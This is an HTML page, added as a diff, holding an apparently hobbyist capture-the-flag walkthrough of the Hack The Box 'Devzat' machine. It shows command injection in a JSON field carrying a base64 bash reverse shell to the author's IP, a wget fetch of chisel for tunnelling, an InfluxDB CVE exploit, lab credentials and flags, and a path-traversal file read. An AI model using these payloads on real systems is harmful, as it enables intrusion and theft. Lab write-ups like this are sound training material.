@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<title>Devzats Walkthough..</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="index.css">
+<head>
+   <link rel="shortcut icon" type="image/x-icon" href="favicon_io (1)/favicon.ico" />
+</head>
+
+<style>
+   body {font-family: "yu gothic"}
+   .Slides {display: none}
+</style>
+
+<body>
+<!-- Navigation bar -->
+<div id='nav'>
+<ul>
+    <li><a href="home.html">Home</a></li>
+    <li><a href="home.html#about">About us</a></li>
+    <li><a href="home.html#contact">contact us</a></li>
+    <li><a href="home.html">Articles</a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+<br><br>
+<pre class="ascii-art, animate_ascii"><b>
+
+   -██▓███---▒█████---██▓--██████--▒█████---███▄----█--▒█████---█----██---██████-
+   ▓██░--██▒▒██▒--██▒▓██▒▒██----▒-▒██▒--██▒-██-▀█---█-▒██▒--██▒-██--▓██▒▒██----▒-
+   ▓██░-██▓▒▒██░--██▒▒██▒░-▓██▄---▒██░--██▒▓██--▀█-██▒▒██░--██▒▓██--▒██░░-▓██▄---
+   ▒██▄█▓▒-▒▒██---██░░██░--▒---██▒▒██---██░▓██▒--▐▌██▒▒██---██░▓▓█--░██░--▒---██▒
+   ▒██▒-░--░░-████▓▒░░██░▒██████▒▒░-████▓▒░▒██░---▓██░░-████▓▒░▒▒█████▓-▒██████▒▒
+   ▒▓▒░-░--░░-▒░▒░▒░-░▓--▒-▒▓▒-▒-░░-▒░▒░▒░-░-▒░---▒-▒-░-▒░▒░▒░-░▒▓▒-▒-▒-▒-▒▓▒-▒-░
+   ░▒-░-------░-▒-▒░--▒-░░-░▒--░-░--░-▒-▒░-░-░░---░-▒░--░-▒-▒░-░░▒░-░-░-░-░▒--░-░
+   ░░-------░-░-░-▒---▒-░░--░--░--░-░-░-▒-----░---░-░-░-░-░-▒---░░░-░-░-░--░--░--
+   -------------░-░---░--------░------░-░-----------░-----░-░-----░-----------░--
+   ------------------------------------------------------------------------------
+      </b></pre>
+   </ul>
+   </div>
+
+<!-- image container -->
+<div class="image-container"> <!-- beginning of image container -->
+   <img src="devzats.jpg" style="width:100%" alt="Devzats  image">
+   <pre id="typewriter">
+          <span class="string-highlight">MS-DOS version 0.07</span>
+          <span class="string-highlight">release 1.01     11/10/83</span><br>
+          <span class="string-highlight">C:\> calculating comandline .. DONE</span>
+          <span class="string-highlight">C:\> Loading command line .... DONE</span>
+          <span class="string-highlight">C:\> type Devzats.txt</span>
+          <span class="string-highlight">publication date - 06th November 2021/13:13</span>
+          <span class="string-highlight">Author - Virgo</span>
+          <img src="http://www.hackthebox.eu/badge/image/524661" alt="Hack The Box">
+          <span class="string-highlight">system - HTB Devzats</span>
+          <span class="string-highlight">OS - Linux</span>
+          <span class="string-highlight">Difficulty - Medium</span>      
+   </pre>
+</div> <!-- end of image container -->
+<br>
+
+<!-- breakup section -->
+<div class="breakup-container"> <!-- beginning of breakup container -->
+   <pre class="ascii-art2, animate_ascii"><b>
+    --------------------------------------------------------------------------------------------------
+       _________
+       / ======= \
+       / __________\
+       | ___________ |
+       | | -       | |
+       | |         | |
+                                | |_________| |________________________ 
+                                \=____________/   Gone Phishing        )
+                               / """"""""""" \                       /
+                             / ::::::::::::: \                  =D-'
+       (_________________)
+    --------------------------------------------------------------------------------------------------
+               </b></pre>
+</div> <!-- end of breakup container -->
+
+<!-- article section -->
+<div class="article-container"> <!-- beginning of breakup container -->
+
+<!-- space fore article -->
+<pre class="article-text" style="font-size: 1vw; float: center;">
+
+▓█████▄-▓█████-██▒---█▓▒███████▒-▄▄▄-----▄▄▄█████▓--██████-
+▒██▀-██▌▓█---▀▓██░---█▒▒-▒-▒-▄▀░▒████▄---▓--██▒-▓▒▒██----▒-
+░██---█▌▒███---▓██--█▒░░-▒-▄▀▒░-▒██--▀█▄-▒-▓██░-▒░░-▓██▄---
+░▓█▄---▌▒▓█--▄--▒██-█░░--▄▀▒---░░██▄▄▄▄██░-▓██▓-░---▒---██▒
+░▒████▓-░▒████▒--▒▀█░--▒███████▒-▓█---▓██▒-▒██▒-░-▒██████▒▒
+-▒▒▓--▒-░░-▒░-░--░-▐░--░▒▒-▓░▒░▒-▒▒---▓▒█░-▒-░░---▒-▒▓▒-▒-░
+-░-▒--▒--░-░--░--░-░░--░░▒-▒-░-▒--▒---▒▒-░---░----░-░▒--░-░
+-░-░--░----░-------░░--░-░-░-░-░--░---▒----░------░--░--░--
+---░-------░--░-----░----░-░----------░--░--------------░--
+-░-----------------░---░-----------------------------------
+________________________________________________
+my ip = 10.10.14.62
+machine (devzat) ip = 10.10.11.118
+machine OS = linux
+________________________________________________
+after running an nmap scan on the ip we find
+all of these ports open:
+
+ Not shown: 997 closed ports
+ PORT     STATE SERVICE VERSION
+ 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey: 
+ |   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
+ |   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
+ |_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
+ 80/tcp   open  http    Apache httpd 2.4.41
+ |_http-server-header: Apache/2.4.41 (Ubuntu)
+ |_http-title: Did not follow redirect to http://devzat.htb/
+ 8000/tcp open  ssh     (protocol 2.0)
+ | fingerprint-strings: 
+ |   NULL: 
+ |_    SSH-2.0-Go
+ | ssh-hostkey: 
+ |_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
+ 1 service unrecognized despite returning data. If you know the service/version,
+  please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+ SF-Port8000-TCP:V=7.91%I=7%D=11/4%Time=6183C8FA%P=x86_64-pc-linux-gnu%r(NU
+ SF:LL,C,"SSH-2\.0-Go\r\n");
+ Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kern
+ 
+we can see a host name of devhat.htb as such we will add this to our
+hosts list in /ect
+after doing this we will be able to try and access
+the webpage tha twe also found on port 80.
+scrolling down the page we can see an ivitation to
+an ssh chat using the following command
+
+ ssh -l [username] devzat.htb -p 8000
+
+of course we will enter the chat with a username
+of our choice. and we gett the following resualts
+as can be seen bellow.
+
+ Welcome to the chat. There are no more users
+ devbot: virgo has joined the chat
+ virgo: hiya
+ virgo: /help
+ [SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
+ [SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
+ [SYSTEM] 
+ [SYSTEM] Interesting features:
+ [SYSTEM] • Many, many commands. Run /commands.
+ [SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
+ [SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
+ [SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an
+          example.
+ [SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
+ [SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
+ [SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
+ [SYSTEM] • Emoji replacements! (like on Slack and Discord)
+ [SYSTEM] 
+ [SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
+ [SYSTEM] 
+ [SYSTEM] Made by Ishan Goel with feature ideas from friends.
+ [SYSTEM] Thanks to Caleb Denio for lending his server!
+ [SYSTEM] 
+ [SYSTEM] For a list of commands run
+ [SYSTEM] ┃ /commands
+ virgo: 
+ 
+as we can see but there isnt much that
+we are able to do to get a shell with this as
+it currently is as such we will try to look for some
+vhosts with the use of ffuf.
+
+<pre class="box0">
+
+ 
+         /'___\  /'___\           /'___\       
+        /\ \__/ /\ \__/  __  __  /\ \__/       
+        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+          \ \_\   \ \_\  \ \____/  \ \_\       
+           \/_/    \/_/   \/___/    \/_/       
+ 
+        v1.3.1 Kali Exclusive 3
+ ________________________________________________
+ 
+  :: Method           : GET
+  :: URL              : http://devzat.htb
+  :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+  :: Header           : Host: FUZZ.devzat.htb
+  :: Follow redirects : false
+  :: Calibration      : false
+  :: Timeout          : 10
+  :: Threads          : 40
+  :: Matcher          : Response status: 200
+ ________________________________________________
+ 
+ pets                    [Status: 200, Size: 510, Words: 20, Lines: 21]
+ :: Progress: [4989/4989] :: Job [1/1] :: 2448 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
+</pre>
+
+as we can see there is a directory named pets as such we
+will try to take a look at this in our browser.
+by first adding it to our own hosts list.
+within the page we can see a couple of pets that have
+been added we can also see tha tthere is a section for
+adding your own new pet.
+
+ifi we tr yfuzzing this page for directorys we are able to
+find a .git directory, so we try and dump the contents of this
+page with the use of the following commands:
+
+________________________________________________
+warning:
+the following tool will have
+to be installed thpugh the use of the github site
+________________________________________________
+
+we will run the command of
+ 
+ gitdumper.sh http://pets.devzat.htb/.git/ pets
+ 
+doing this will dump the contents of the 
+sites diretory and as such once this is done we will
+be able to try an dlook at the commits doing so we see a
+file named main.go.
+
+looking at the code itself we can see thta the code
+itself we can see it will execute the commands that are enterd
+as such we will try OS command injection and use burp to try and 
+intercept the request that it will send.
+
+<pre class="box0">
+we will try to complete this by entering the folowing into our own
+machine:
+ 
+ sudo tcpdump -i tun0 icmp
+ 
+and then the following (below) into
+the pets create section of the webpage:
+
+ ping -c 4 10.10.14.62
+ 
+once ww have typed this then we will set up burp quickly
+and once burp has bee nstartedand is intersepting our browser
+requests then we can send in, after doing so we should se the folowing 
+as a response from butp
+
+ HTTP/1.1 200 OK
+ Date: Thu, 04 Nov 2021 13:06:27 GMT
+ Server: My genious go pet server
+ Content-Length: 26
+ Content-Type: text/plain; charset=utf-8
+ Connection: close
+
+ Pet was added successfully
+
+and then looking at our comamnd we should then
+see the following text come thoguh:
+ 
+ tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+ 12:51:06.902931 IP devzat.htb > 10.10.14.62: ICMP echo request, id 1, seq 1, length 64
+ 12:51:06.902949 IP 10.10.14.62 > devzat.htb: ICMP echo reply, id 1, seq 1, length 64
+ 12:51:07.862397 IP devzat.htb > 10.10.14.62: ICMP echo request, id 1, seq 2, length 64
+ 12:51:07.862410 IP 10.10.14.62 > devzat.htb: ICMP echo reply, id 1, seq 2, length 64
+ 12:51:08.863234 IP devzat.htb > 10.10.14.62: ICMP echo request, id 1, seq 3, length 64
+ 12:51:08.863269 IP 10.10.14.62 > devzat.htb: ICMP echo reply, id 1, seq 3, length 6
+
+next we will try to send a revshell
+first we will create a payload with base 64 and then use the same 
+burp repeater to sent the base64 payload by the following:
+
+ POST /api/pet HTTP/1.1
+ Host: pets.devzat.htb
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://pets.devzat.htb/
+ Content-Type: text/plain;charset=UTF-8
+ Origin: http://pets.devzat.htb
+ Content-Length: 117
+ Connection: close
+
+ {"name":"button","species":"cat;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Mi82NjYwIDA+JjE= | base64 -d | bash"}
+</pre>
+
+before we send this we will start a netcat 
+session to the port that we picked for our payload.
+after sending this we will get the response of patrick@devzat
+________________________________________________
+taking a look around an this int our user acount so we
+will first look at what is running on the system, where we see that 
+there is a port we didnt find in the orginal scan.
+as such we will forward this to our machine with chisel.
+
+of course this measn we must transfer chisel to our patrick account
+we will do this with the following commands:
+ 
+ python3 -m http.server 80
+     ^ this will be ran in our chisel directory
+     
+on the patrick account we will then grab and give
+it privlages.
+
+<pre class="box0">
+  wget 10.10.14.62/chisel
+ --2021-11-04 13:30:10--  http://10.10.14.62/chisel
+ Connecting to 10.10.14.62:80... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 12329071 (12M) [application/octet-stream]
+ Saving to: ‘chisel
+ 
+ chmod +x chisel
+ 
+we can then on our own mahcine run the chisel listen
+command to try and get the port that we are after:
+ 
+ ./chisel server -p 8000 --reverse
+ 
+and then on patrick
+
+ patrick@devzat:~$ ./chisel client 10.10.14.62:8000 R:8086:127.0.0.1:8086
+</pre>
+
+aftre doing this we can run an nmap scan on this 
+new port which tells us that it is running InfluxDB
+so of course we lok for exploits around this where we find a 
+zero day - what chould go wrong.
+so swe dowload this to our machine though git clone
+
+ git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
+
+after doing this we can run it and enter the following into the feilds
+when required by the program:
+
+   _____        __ _            _____  ____    ______            _       _ _   
+  |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |                            
+    | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_                           
+    | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|                          
+   _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_                           
+  |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|                          
+                                                         | |                                            
+                                                         |_|                                            
+ CVE-2019-20933
+
+ Insert ip host (default localhost): 
+ Insert port (default 8086): 
+ Insert influxdb user (wordlist path to bruteforce username): /usr/share/wordlists/seclists/Usernames/Names/names.txt
+ 
+this then (provided every thing was installed) allows
+use to select the database of devzat before then running the select 
+command to try and get the password for our new user of cathrine
+ 
+ SELECT * FROM "user"
+ 
+this gives us  alogin for cathine:
+
+ username = catherine
+ password = woBeeYareedahc7Oogeephies7Aiseci
+
+we can then go into catherines folder and then get the id_rsa
+key so we have coninuious access and also going back to home.
+this gives us access to catherine and the user flag /token:
+
+ user flag / token = 54a7a53d9c36a0c71f87a98c99af56ec
+________________________________________________
+once we have catherine, looking around the folders.
+we can see files in the backups folder that has two zip files
+these files we will move them into the /tmp file before extracting them
+whils tdoing so, we can use linpeas to ee if there are any other things we can try 
+to exploit for out root, this doesnt find much other than what we have found.
+we will try to unzip the folders and then go into them one of the first ones that 
+sticks out to me is the command.go file
+
+which has a feild where it says 
+
+ if pass != "CeilingCatStillAThingIn2021?" {...
+ 
+this tells us the password for the ssh messaging aplication
+that we found earlier and accessed, but couldnt do much on.
+we now could maybe could use the functions that we also found in the files
+to use read capabilities.
+as such we use the following commands to get the root flag:
+
+<pre class="box0">
+ ssh -l /exit localhost -p 8443
+
+ /exit: /file /root/root.txt
+ [SYSTEM] You need to provide the correct password to use this function
+ /exit: /file /root/root.txt CeilingCatStillAThingIn2021?
+ [SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
+ /exit: /file../root.txt
+ [SYSTEM] Command not found..? Check /help for a list of commands
+
+2 minutes in:
+
+ /exit: /file../root.txt CeilingCatStillAThingIn2021?
+ [SYSTEM] Command not found..? Check /help for a list of commands
+ /exit: /file ../root.txt CeilingCatStillAThingIn2021?
+ [SYSTEM] cca9d5cd37ac473a6fe710d6ede356eb
+</pre>
+
+as we can see we try to access the file but it says it does exit
+as such we go back a directory we are then able to read the root.txt 
+as our user of catherine.
+
+ root flag / token = cca9d5cd37ac473a6fe710d6ede356eb
+________________________________________________
+so even though i had found the flags,and checked online to see
+if i had gotten them from the correct areas or to see if what i had done was wrong, 
+HTB - hack the box seemed to say they where wrong despite me doing the machine 
+whilst it was still active which was to say the least annoying.....
+
+so your mileage may vary..
+</pre>
+</div><!-- end of article container -->
+
+<br>
+<br>
+<!-- Footer Section -->
+<div class="footer_container" style="width:100%"> <!-- beginning of Footer container -->
+   
+</Div> <!-- end of footer container -->
+   <div style="background-color: black;"></div>
+   <img src="footer reference.PNG" style="width:100%">
+</body>
+</html>
